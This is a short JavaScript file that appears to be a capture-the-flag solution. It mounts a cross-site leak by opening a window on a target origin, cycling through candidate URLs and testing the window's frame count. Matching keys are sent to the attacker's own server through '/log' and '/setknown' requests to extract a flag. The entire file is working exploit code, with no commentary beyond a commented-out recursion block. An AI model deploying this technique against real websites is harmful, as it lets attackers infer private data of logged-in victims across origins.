let u = new URL((new URLSearchParams(window.location.search)).get('target'))
const target = u.origin
const atkid = u.pathname.slice(6,-1)
window.onmessage = e=>{
	console.log(e.data.history)
}

let flag = ''
async function init(){
	await fetch('/setknown?flag='+flag)
	await fetch('/setatkid?atkid='+atkid)
}

async function leak(){
	let toleak = await fetch('/getstuff')
	toleak = await toleak.json()

	let toleakKeys = Object.keys(toleak)
	let x = window.open('/dfdf','x')
	for(let i=0;i<toleakKeys.length;i++){
		x.location = target+toleak[toleakKeys[i]]
		await new Promise((req,res)=>setTimeout(req,500))
		if(x.length == 0){fetch('/log?log='+toleakKeys[i])}
	}
	

	// if(cor != ''){
	// 	flag = cor
	// 	await fetch('/setknown?flag='+flag)
	// 	fetch('/log?log='+flag)
	// }

	// console.log(flag)
	// leak()
}

init().then(leak)